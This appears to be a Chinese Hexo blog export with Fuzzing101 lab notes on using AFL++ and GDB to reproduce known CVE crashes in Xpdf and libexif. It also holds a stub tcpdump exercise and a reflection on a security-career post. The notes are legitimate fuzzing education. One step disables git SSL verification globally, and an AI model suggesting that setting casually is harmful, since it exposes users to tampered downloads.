      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Exercise3</title>
    <link href="/2023/07/22/Exercise3/"/>
    <url>/2023/07/22/Exercise3/</url>
    
    <content type="html"><![CDATA[<h2 id="Exercise3-TCPdump"><a href="#Exercise3-TCPdump" class="headerlink" title="Exercise3 TCPdump"></a>Exercise3 TCPdump</h2><h3 id="任务目标"><a href="#任务目标" class="headerlink" title="任务目标"></a>任务目标</h3><ul><li>在TCPdump4.9.2中找到 <a href="https://www.cvedetails.com/cve/CVE-2017-13028/"><strong>CVE-2017-13028</strong></a>的崩溃</li><li>了解什么是Address Sanitizer</li><li>了解如何使用ASan模糊目标分析崩溃</li></ul><h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p><strong>下载安装TCPdump</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-variable">$HOME</span><br>mkdir fuzzing_tcpdump &amp;&amp; cd fuzzing_tcpdump/<br><br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/the-tcpdump-group/</span>tcpdump<span class="hljs-regexp">/archive/</span>refs<span class="hljs-regexp">/tags/</span>tcpdump-<span class="hljs-number">4.9</span>.<span class="hljs-number">2</span>.tar.gz<br>tar -xzvf tcpdump-<span class="hljs-number">4.9</span>.<span class="hljs-number">2</span>.tar.gz<br></code></pre></td></tr></table></figure><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3>]]></content>
    
    
    <categories>
      
      <category>Fuzzing101</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Exercise2</title>
    <link href="/2023/07/19/Exercise2/"/>
    <url>/2023/07/19/Exercise2/</url>
    
    <content type="html"><![CDATA[<h2 id="Exercise2-libexif"><a href="#Exercise2-libexif" class="headerlink" title="Exercise2 libexif"></a>Exercise2 libexif</h2><h3 id="任务目标："><a href="#任务目标：" class="headerlink" title="任务目标："></a>任务目标：</h3><p>对libexif EXIF解析库进行模糊测试，目标是在 libexif 0.6.14 中找到 <a href="https://nvd.nist.gov/vuln/detail/CVE-2009-3895">CVE-2009-3895</a> （一种基于堆的缓冲区溢出）的崩溃&#x2F;PoC 和 <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2836">CVE-2012-2836</a> （越界读取漏洞）的另一个崩溃。</p><h3 id="实验流程"><a href="#实验流程" class="headerlink" title="实验流程"></a>实验流程</h3><p><strong>下载并解压libexif</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/libexif/</span>libexif<span class="hljs-regexp">/archive/</span>refs<span class="hljs-regexp">/tags/</span>libexif-<span class="hljs-number">0</span>_6_14-release.tar.gz<br>tar -xzvf libexif-<span class="hljs-number">0</span>_6_14-release.tar.gz<br></code></pre></td></tr></table></figure><p>libexif是一个开源的用于处理Exchangeable Image File Format (EXIF) 数据的C语言库，提供了一组功能强大的API，用于读取、写入和操作EXIF数据。</p><p><strong>安装libexif</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd libexif-libexif-0_6_14-release/<br>sudo apt-<span class="hljs-built_in">get</span> install autopoint libtool gettext libpopt-dev<br>autoreconf -fvi<br>./configure <span class="hljs-attribute">--enable-shared</span>=<span class="hljs-literal">no</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p><code>autoreconf</code> 是一个用于自动重建 Autotools 构建系统的工具，该命令通常用于在源代码目录中运行 Autotools 工具链，以重新生成配置脚本 <code>configure</code>、构建规则 <code>Makefile.in</code> 和其他相关文件。这样可以确保配置和构建系统与当前环境和依赖项保持同步。</p><p><strong>安装EXIF</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/fuzzing_libexif<br>wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gz<br>tar -xzvf exif-0_6_15-release.tar.gz<br><br><span class="hljs-built_in">cd</span> exif-exif-0_6_15-release/<br>autoreconf -fvi<br>./configure --enable-shared=no --prefix=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span> PKG_CONFIG_PATH=<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig<br>make<br>make install<br></code></pre></td></tr></table></figure><p>由于libexif是一个库，是一组功能的集合而本身不是一个独立的执行文件，因此需要安装使用这个库的一个应用程序来进行模糊测试。使用库的程序通常会验证输入数据的有效性和合法性。模糊测试工具可能生成具有不同格式的输入，包括不合法的输入。使用该库的程序可以验证并解析这些输入。</p><p><strong>验证安装</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_libexif/i</span>nstall<span class="hljs-regexp">/bin/</span>exif<br></code></pre></td></tr></table></figure><p><strong>获取样本</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-variable">$HOME</span>/fuzzing_libexif<br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ianare/</span>exif-samples<span class="hljs-regexp">/archive/</span>refs<span class="hljs-regexp">/heads/m</span>aster.zip<br>unzip master.zip<br></code></pre></td></tr></table></figure><p><strong>使用alf-clang-lto编译libexif和exif</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">rm -r <span class="hljs-variable">$HOME</span>/fuzzing_libexif/install<br>cd <span class="hljs-variable">$HOME</span>/fuzzing_libexif/libexif-libexif-0_6_14-release/<br>make clean<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-attribute">CC</span>=afl-clang-lto ./configure <span class="hljs-attribute">--enable-shared</span>=<span class="hljs-literal">no</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd <span class="hljs-variable">$HOME</span>/fuzzing_libexif/exif-exif-0_6_15-release<br>make clean<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-attribute">CC</span>=afl-clang-lto ./configure <span class="hljs-attribute">--enable-shared</span>=<span class="hljs-literal">no</span> <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span> <span class="hljs-attribute">PKG_CONFIG_PATH</span>=<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig<br>make<br>make install<br></code></pre></td></tr></table></figure><p>afl-clang-lto 是 AFL的一个定制版本，它使用了 Link Time Optimization（LTO）技术。LTO 可以在链接时优化代码，包括在不同编译单元之间进行全局的代码优化。通过使用 afl-clang-lto 编译，可以提高模糊测试的代码覆盖率，因为优化的代码更有可能探索到更多路径和分支。同时相比于afl-clang，afl-clang-lto具有更好的性能。</p><p><strong>进行模糊测试</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">afl-fuzz -i <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_libexif/</span>exif-samples-master<span class="hljs-regexp">/jpg/</span> -o <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_libexif/</span>out<span class="hljs-regexp">/ -s 123 -- $HOME/</span>fuzzing_libexif<span class="hljs-regexp">/install/</span>bin/exif @@<br></code></pre></td></tr></table></figure><p>得到如下输出</p><p><img src="/2023/07/19/Exercise2/image-20230721171848925.png" alt="image-20230721171848925"></p><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><p>编译出带调试信息的可执行文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd libexif-libexif-0_6_14-release<br>make clean<br><span class="hljs-attribute">CFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> <span class="hljs-attribute">CXXFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br> <br>cd exif-exif-0_6_15-release<br>make clean<br><span class="hljs-attribute">CFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> <span class="hljs-attribute">CXXFLAGS</span>=<span class="hljs-string">&quot;-g -O0&quot;</span> <span class="hljs-attribute">PKG_CONFIG_PATH</span>=<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/lib/pkgconfig ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_libexif/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p>通过GDB跑出crash</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gdb --args .<span class="hljs-regexp">/install/</span>bin<span class="hljs-regexp">/exif ./</span>out<span class="hljs-regexp">/default/</span>crashes/&lt;your filename&gt;<br></code></pre></td></tr></table></figure><p><strong>crash1</strong></p><p><img src="/2023/07/19/Exercise2/image-20230722111050543.png" alt="image-20230722111050543"></p><p>与Exercise1一样，报错为SIGSEGV，Segmentation fault，存在内存泄漏，根据报错信息可以看出为地址无法访问</p><p><strong>crash2</strong></p><p><img src="/2023/07/19/Exercise2/image-20230722111516258.png" alt="image-20230722111516258"></p><p>错误信息：存在内存泄漏</p><p>错误位置：..&#x2F;sysdeps&#x2F;x86_64&#x2F;multiarch&#x2F;memmove-vec-unaligned-erms.S</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>官方修复方案：</p><ul><li><a href="https://github.com/libexif/libexif/commit/8ce72b7f81e61ef69b7ad5bdfeff1516c90fa361">https://github.com/libexif/libexif/commit/8ce72b7f81e61ef69b7ad5bdfeff1516c90fa361</a></li><li><a href="https://github.com/libexif/libexif/commit/00986f6fa979fe810b46e376a462c581f9746e06">https://github.com/libexif/libexif/commit/00986f6fa979fe810b46e376a462c581f9746e06</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Fuzzing101</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing101-Exercise1</title>
    <link href="/2023/07/09/Exercise1/"/>
    <url>/2023/07/09/Exercise1/</url>
    
    <content type="html"><![CDATA[<h2 id="Fuzzing-101"><a href="#Fuzzing-101" class="headerlink" title="Fuzzing 101"></a>Fuzzing 101</h2><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h3><p>实验目的：安装Xpdf，安装AFL工具并了解如何使用</p><p>创建目录并安装基本工具包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> fuzzing_xpdf &amp;&amp; <span class="hljs-built_in">cd</span> fuzzing_xpdf/<br>sudo apt install build-essential<br></code></pre></td></tr></table></figure><p>下载，解压Xpdf，并完成安装</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">wget https://<span class="hljs-keyword">dl</span>.xpdfreader.<span class="hljs-keyword">com</span>/old/xpdf-<span class="hljs-number">3.02</span>.tar.gz<br>tar -xvzf xpdf-<span class="hljs-number">3.02</span>.tar.gz<br><span class="hljs-keyword">cd</span> xpdf-<span class="hljs-number">3.02</span><br>sudo apt <span class="hljs-keyword">update</span> &amp;&amp; sudo apt install -<span class="hljs-keyword">y</span> build-essential gcc<br>./configure --prefix=<span class="hljs-string">&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure><p>测试Xpdf，可以下载测试样例或者自己造一个pdf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/fuzzing_xpdf<br><span class="hljs-built_in">mkdir</span> pdf_examples &amp;&amp; <span class="hljs-built_in">cd</span> pdf_examples<br>wget http://www.africau.edu/images/default/sample.pdf<br></code></pre></td></tr></table></figure><p>通过命令 <code>$HOME/fuzzing_xpdf/install/bin/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/sample.pdf</code>  可以得到如下输出</p><p><img src="/2023/07/09/Exercise1/image-20230708231306619.png" alt="image-20230708231306619"></p><p><code>$HOME/fuzzing_xpdf/install/bin/pdfinfo</code> 指定的要执行的程序路径，<code>-box -meta</code> 是向pdfinfo程序传递的选项和参数，-box 表示显示文档的页面框线，-meta显示文档的元数据信息</p><p><code>$HOME/fuzzing_xpdf/pdf_examples/sample.pdf</code> 指定的是要操作的pdf文件</p><p><img src="/2023/07/09/Exercise1/image-20230708231459280.png" alt="image-20230708231459280"></p><p>在pdfinfo的目录下还有如下程序：</p><ul><li>pdffonts：用于显示 PDF 文件中使用的字体信息，包括字体名称、类型、嵌入状态等</li><li>pdfimages：用于从 PDF 文件中提取图像。它可以将 PDF 文件中的图像提取为独立的图像文件</li><li>pdftops：用于将 PDF 文件转换为 PostScript 格式。PostScript 是一种页面描述语言，可以在打印机或其他设备上进行渲染和打印</li><li>pdftotext：用于将 PDF 文件中的文本提取为纯文本格式</li></ul><p>接下来安装AFL++</p><p>第一条安装命令用于安装构建软件包（<code>build-essential</code>）、Python 3 开发库（<code>python3-dev</code>）、自动构建工具（<code>automake</code>）、版本控制工具 Git（<code>git</code>）、词法分析器生成器 Flex（<code>flex</code>）、语法分析器生成器 Bison（<code>bison</code>）、GLib 开发库（<code>libglib2.0-dev</code>）、像素管理库 Pixman 开发库（<code>libpixman-1-dev</code>）以及 Python 3 的 setuptools。</p><p>第二条安装命令用于安装 LLVM 和 Clang </p><p>第三条安装命令根据系统上已安装的 GCC 版本，安装相应的插件开发包和 libstdc++ 开发库</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">sudo apt-get update<br>sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.<span class="hljs-number">0</span>-dev libpixman-<span class="hljs-number">1</span>-dev python3-setuptools<br>sudo apt-get install -y lld-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span>-dev clang-<span class="hljs-number">11</span><span class="hljs-operator"> || </span>sudo apt-get install -y lld llvm llvm-dev clang <br>sudo apt-get install -y gcc-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-plugin-dev libstdc++-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-dev<br></code></pre></td></tr></table></figure><p>接着安装AFL++工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span><br>git <span class="hljs-built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus &amp;&amp; <span class="hljs-built_in">cd</span> AFLplusplus<br><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br>make distrib<br>sudo make install<br></code></pre></td></tr></table></figure><p>此处遇到一个报错：</p><p><img src="/2023/07/09/Exercise1/image-20230709105123404.png" alt="image-20230709105123404"></p><p>可以通过禁用SSL证书解决，但会降低安全性，需要在可靠的网络环境中操作</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> install gnutls-bin<br>git<span class="hljs-built_in"> config </span>--global http.sslVerify <span class="hljs-literal">false</span><br>git<span class="hljs-built_in"> config </span>--global http.postBuffer 1048576000<br></code></pre></td></tr></table></figure><p>至此AFL安装完成，可以输入 <code>afl-fuzz</code>得到如下输出</p><p><img src="/2023/07/09/Exercise1/image-20230709151638679.png" alt="image-20230709151638679"></p><p>通过命令，可以对pdftotext进行测试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">afl-fuzz -i <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>pdf_examples<span class="hljs-regexp">/ -o $HOME/</span>fuzzing_xpdf<span class="hljs-regexp">/out/</span> -s <span class="hljs-number">123</span> -- <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext @@ <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>output<br></code></pre></td></tr></table></figure><p>该命令使用 AFL 工具对 pdftotext 程序进行模糊测试。它从指定的输入文件夹中获取测试样本，将 AFL 输出结果保存到out中。使用随机数种子 123，测试 pdftotext 程序，并将程序的输出结果保存到output中</p><p>等待程序运行可以得到如下结果，红色的为发现的崩溃</p><p><img src="/2023/07/09/Exercise1/image-20230709215359532.png" alt="image-20230709215359532"></p><p>运行命令，<code>-g</code> 选项用于在编译过程中生成调试符号信息，而 <code>-O0</code> 选项则指示编译器禁用优化。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">make clean<br><span class="hljs-attribute">CFLAGS</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span> CXXFLAGS<span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span> ./configure --prefix<span class="hljs-operator">=</span><span class="hljs-string">&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p>运行gdb，此处的your filename应该填写crashes文件夹中的，包含报错信息的文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gdb --args <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>out<span class="hljs-regexp">/default/</span>crashes<span class="hljs-regexp">/&lt;your filename&gt; $HOME/</span>fuzzing_xpdf/output<br></code></pre></td></tr></table></figure><p>输入run或者r来运行，可以得到错误信息，程序收到了SIGSEGV信号，也称为分段错误（Segmentation fault）。这种错误通常是由于访问无效的内存地址导致的。</p><p><img src="/2023/07/09/Exercise1/image-20230716150720853.png" alt="image-20230716150720853"></p><p>通过bt命令进行回溯，可以看到反复进行了getobj和makestream的调用</p><p><img src="/2023/07/09/Exercise1/image-20230716153423406.png" alt="image-20230716153423406"></p><p>下载官方修复了该问题的Xpdf4.02发现，与此版本相比，添加了一个记录循环次数的变量，解决该问题</p><p>旧：</p><p><img src="/2023/07/09/Exercise1/image-20230716153759316.png" alt="image-20230716153759316"></p><p>新：</p><p><img src="/2023/07/09/Exercise1/image-20230716154017601.png" alt="image-20230716154017601"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>此次实验了解了模糊测试器功能，通过种子的变异和组合不断对pdftotext这个程序进行测试。同时也熟悉了gdb的相关操作以及提升了一定的程序流分析能力。</p>]]></content>
    
    
    <categories>
      
      <category>Fuzzing101</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>读后感：So you want to work in security?</title>
    <link href="/2023/07/07/ReflectionPeper/"/>
    <url>/2023/07/07/ReflectionPeper/</url>
    
    <content type="html"><![CDATA[<h2 id="读后感：So-you-want-to-work-in-security"><a href="#读后感：So-you-want-to-work-in-security" class="headerlink" title="读后感：So you want to work in security?"></a>读后感：So you want to work in security?</h2><p><a href="http://ifsec.blogspot.com/2018/02/so-you-want-to-work-in-security-and-for.html">So you want to work in security?</a></p><h3 id="得忙起来"><a href="#得忙起来" class="headerlink" title="得忙起来"></a>得忙起来</h3><p>对于这篇博客，我更愿意将其视作一个纠正我暑期，或是说毕业之后的一个较为松懈的学习态度以及开学前以何种学习方式去补充自己的不足的一篇文章。</p><p>显然，本科毕业确实给我带来了一些可能与我并不相称的快乐，即其实我算是选择大于努力的那一部分人，在考研过程中我并未付出和其他人那般的努力，所以其实更应该看到自己与别人的差距，让我快要生锈的脑子转起来。</p><h3 id="任重道远"><a href="#任重道远" class="headerlink" title="任重道远"></a>任重道远</h3><p>安全方向所涉及的知识面的广度，在我浅薄的认知里，我认为是大于其他方向的。这一点其实早期在蓝鲸短暂学习的时候就感受过了。而其实这也是我在文中感觉被狠狠打脸的一部分。“<strong>Don’t give up when you encounter things you don’t understand</strong>”文中如是说，其实原来我很有幸的扛过了蓝鲸筛选的第一阶段，但随着难度上升，我逃避了。很戏谑的，某学长就在交流中问过：“这回学不学的下去”。我认为这一点确实也是我需要去克服的。</p><p>同时，文中写到要充分利用资源，对于这一点，我认为应该是充分的利用有效资源，或者说是如何高效的利用资源处理亟待解决的问题。其实无论从本科的学习还是说之前的毕设或者是论文分享，都可以看出，查找学习知识是一个类似于剥洋葱的过程，查找A中发现有B不懂，那么再去找B，学习B是发现其中出现的C，D不清楚，那么就应该先去把C，D看懂，再一层层往上反着推，无疑这会消耗大量时间，但总归是要比一知半解的了解A是什么会来的更有收获。</p><h3 id="保持思考"><a href="#保持思考" class="headerlink" title="保持思考"></a>保持思考</h3><p>这一点不仅是说是，如何去提出问题，也是面对一个问题时你能怎么去解决。安全方面，解决问题需要灵活性，可能本科期间，多数时间我们都在跟着课本学习所谓的标准答案，也就是文中提到的“If you prefer to follow a pre-set curriculum, you’re not going to get very far in security”跟着预定的课程走。我确实不否认我更乐意去按着安排做事儿，答案跟着标准答案走，但我觉着确实也应该做出一些突破了。</p>]]></content>
    
    
    <categories>
      
      <category>Something interesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>read</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
